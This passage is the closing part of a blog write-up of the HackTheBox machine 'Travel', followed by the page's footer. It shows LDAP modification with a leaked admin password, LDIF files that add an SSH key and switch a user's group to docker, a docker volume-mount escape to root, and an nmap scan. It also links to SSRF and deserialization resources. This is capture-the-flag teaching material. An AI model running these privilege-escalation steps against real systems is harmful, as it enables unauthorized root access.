+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapmodify <span class="nt">-x</span> <span class="nt">-H</span> ldap://ldap.travel.htb <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> file.ldif <span class="nt">-c</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># SSH.ldif</span>
+<span class="c"># adding SSH key</span>
+dn: <span class="nv">uid</span><span class="o">=</span>frank,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+changeType: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: your-public-key
+</code></pre></div></div>
+<p>I tried a couple of GIDs (0, lxd..) first but docker was the one that opened the path to root for me.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Group.ldif</span>
+<span class="c"># replacing GID by 117 (docker)</span>
+dn: <span class="nv">uid</span><span class="o">=</span>frank,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+changeType: modify
+replace: gidNumber
+gidNumber: 117
+</code></pre></div></div>
+<p>And we can now log into the box as frank and take a look at the available docker images. Mounting the appropriate one gets the job done:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@travel:~<span class="nv">$ </span>docker images
+REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+nginx                 latest              602e111c06b6        3 months ago        127MB
+memcached             latest              ac4488374c89        3 months ago        82.3MB
+blog                  latest              4225bf7c5157        3 months ago        981MB
+ubuntu                18.04               4e5021d210f6        4 months ago        64.2MB
+jwilder/nginx-proxy   alpine              a7a1c0b44c8a        5 months ago        54.6MB
+osixia/openldap       latest              4c780dfa5f5e        9 months ago        275MB
+
+frank@travel:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> ubuntu:18.04
+<span class="o">[</span>snip]
+root@998315a25191:/# <span class="nb">ls</span> /mnt/root/
+bin  root.txt  snap
+root@998315a25191:/# <span class="nb">cat</span> /mnt/root/root.txt
+<span class="o">[</span>redacted]
+</code></pre></div></div>
+<h1 id="resources">Resources</h1>
+<h2 id="nmap-scan"><a name="Nmap scan"></a>Nmap scan</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Sun Jun 28 12:15:54 2020 as: nmap -sC -sV -oN initial.nmap -p- -Pn 10.10.10.189
+Nmap scan report for travel (10.10.10.189)
+Host is up (0.024s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB
+443/tcp open  ssl/http nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Not valid before: 2020-04-23T19:24:29
+|_Not valid after:  2030-04-21T19:24:29
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jun 28 12:16:20 2020 -- 1 IP address (1 host up) scanned in 25.93 seconds
+</code></pre></div></div>
+<h2 id="tools-and-reading">Tools and reading</h2>
+<p><a name="[0]">[0]</a> <a href="https://github.com/arthaud/git-dumper">Git-dumper</a></p>
+
+<p><a name="[1]">[1]</a> <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">Bypassing SSRF restrictions</a></p>
+
+<p><a name="[2]">[2]</a> <a href="https://github.com/tarunkant/Gopherus">Gopherus - creating SSRF payloads</a></p>
+
+<p><a name="[3]">[3]</a> <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Post on exploiting PHP deserialization</a></p>
+
+<p><a name="[4]">[4]</a> <a href="https://www.unserialize.com/">Tool to view your serialized string</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#docker" class="page__taxonomy-item" rel="tag">docker</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ldap" class="page__taxonomy-item" rel="tag">ldap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#memcached" class="page__taxonomy-item" rel="tag">memcached</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#boxes" class="page__taxonomy-item" rel="tag">boxes</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-29T21:33:36-04:00">June 29, 2020</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+Travel%20http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Ftravel%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Ftravel%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Ftravel%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/boxes/forwardslash/" class="pagination--pager" title="HackTheBox - Forwardslash
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/forwardslash/" rel="permalink">HackTheBox - Forwardslash
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the box Forwardslash from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/player2/" rel="permalink">HackTheBox - PlayerTwo
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  25 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the box PlayerTwo from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/ServMon/" rel="permalink">HackThebox - ServMon
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  5 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the box ServMon from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 Philipp Menner. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
